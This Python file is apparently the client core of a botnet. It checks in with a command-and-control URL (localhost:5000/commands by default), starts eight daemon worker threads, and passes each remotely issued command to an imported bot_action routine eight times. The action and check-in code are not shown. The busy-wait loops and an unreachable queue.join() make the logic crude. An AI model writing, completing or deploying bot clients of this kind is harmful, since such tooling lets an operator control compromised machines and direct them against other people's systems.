from bot_actions import bot_action
from cnc_checkin import cnc_checkin
from queue import Queue
from threading import Thread

class BotWorker(Thread):

    def __init__(self, queue):
        Thread.__init__(self)
        self.queue = queue

    def run(self):
        while True:
            command = self.queue.get()
            bot_action(command)
            self.queue.task_done()


class BotInstance:

    def __init__(self,cnc_url="http://127.0.0.1:5000/commands",commands=None,wait_time=10,prev_commands=None):
        self.cnc_url = cnc_url
        self.commands = commands
        self.wait_time = wait_time
        self.prev_commands = prev_commands
    def main(self):
        queue = Queue()
        cnc_thread = cnc_checkin(BotInstance=self)
        cnc_thread.daemon = True
        cnc_thread.start()
        while self.commands == None:
            continue
        for i in range(8):
            worker = BotWorker(queue)
            worker.daemon = True
            worker.start()
        while True:
            if self.prev_commands != self.commands:
                for i in range(8):
                    for commands in self.commands:
                        queue.put(commands)
                        
                self.prev_commands = self.commands

        queue.join()


bot = BotInstance()
bot.main()
